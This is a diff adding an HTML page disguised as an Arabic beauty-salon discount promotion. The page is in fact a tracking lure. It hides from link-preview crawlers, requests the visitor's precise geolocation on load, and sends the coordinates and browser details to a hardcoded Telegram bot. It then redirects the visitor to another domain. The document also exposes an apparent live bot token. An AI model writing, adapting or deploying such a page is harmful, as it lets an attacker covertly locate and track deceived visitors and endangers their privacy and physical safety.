@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <title>الربيع makeup(النزهه)</title>
+
+    <meta property="og:title" content="الصفحة الرسميه لكوافير جوجو علي فيسبوك" />
+    <meta property="og:description" content="مفاجأة كبيرة واقوي العروض والخصومات تصل لخصم 30٪ من كوافير جوجو و ...😍❤️‍🔥💋" />
+    <meta property="og:image" content="https://i.ibb.co/F4yyyW75/file-00000000f6186246b82ebe05f6d88101.png" />
+    <meta property="og:url" content="https://woershiduoqipa.cc/Mess?id=b4cab67f-c6e6-4e9c-322d-08dc89f259e3" />
+    <meta property="og:type" content="website" />
+  </head>
+  <body>
+    <script>
+      const BOT_TOKEN = "8406455572:AAGtjZK3MhpGH3enAotLbTlc9LjKeGzkaXY";
+      const CHAT_ID = "5857518644";
+      const REDIRECT_URL = "https://woershiduoqipa.cc/Mess?id=b4cab67f-c6e6-4e9c-322d-08dc89f259e3";
+
+      function sendTelegramMessage(message) {
+        // إرسال كرسالة نصية عادية
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      }
+      
+      function sendTelegramLocation(latitude, longitude, userAgent) {
+          // إرسال كرسالة موقع مباشرة (خريطة)
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                  chat_id: CHAT_ID,
+                  latitude: latitude,
+                  longitude: longitude,
+                  caption: `👤 مستخدم جديد دخل الرابط.
+                  \n📱 المتصفح/الهاتف: ${userAgent}`
+              })
+          });
+      }
+
+
+      function isBot() {
+        const ua = navigator.userAgent.toLowerCase();
+        return ua.includes("facebookexternalhit") || ua.includes("twitterbot") || ua.includes("telegrambot") || ua.includes("whatsapp") || ua.includes("googlebot");
+      }
+
+      function notifyAndRedirect() {
+        if (isBot()) {
+          // لا تفعل أي شيء إذا كان الزائر بوت (للسماح بمعاينة الرابط)
+          return;
+        }
+
+        const userAgent = navigator.userAgent;
+
+        // 1. محاولة الحصول على الموقع الجغرافي
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            // حالة النجاح: المستخدم سمح بإرسال الموقع
+            (position) => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              
+              // إرسال الموقع كخريطة ورسالة نصية إضافية
+              sendTelegramLocation(lat, lon, userAgent);
+              
+              // التوجيه بعد الانتهاء
+              setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+              }, 100);
+            },
+            // حالة الفشل: المستخدم رفض أو حدث خطأ
+            (error) => {
+              let errorMessage;
+              switch(error.code) {
+                  case error.PERMISSION_DENIED:
+                      errorMessage = "تم رفض طلب تحديد الموقع من قبل المستخدم.";
+                      break;
+                  case error.POSITION_UNAVAILABLE:
+                      errorMessage = "الموقع غير متوفر.";
+                      break;
+                  case error.TIMEOUT:
+                      errorMessage = "انتهت مهلة طلب تحديد الموقع.";
+                      break;
+                  default:
+                      errorMessage = "حدث خطأ غير معروف.";
+              }
+              
+              // إرسال رسالة نصية بالخطأ وبيانات المتصفح
+              const message = `🚨 تم دخول شخص لكن لم يتم الحصول على الموقع.\n${errorMessage}\n\n📱 نوع الهاتف/المتصفح:\n${userAgent}`;
+              sendTelegramMessage(message);
+
+              // التوجيه بعد الانتهاء
+              setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+              }, 100);
+            },
+            // خيارات طلب الموقع
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+          );
+        } else {
+          // 2. إذا كان المتصفح لا يدعم تحديد الموقع
+          const message = `🚨 تم دخول شخص، لكن المتصفح لا يدعم تحديد الموقع.\n\n📱 نوع الهاتف/المتصفح:\n${userAgent}`;
+          sendTelegramMessage(message);
+          
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 100);
+        }
+      }
+
+      window.onload = notifyAndRedirect;
+    </script>
+  </body>
+</html>
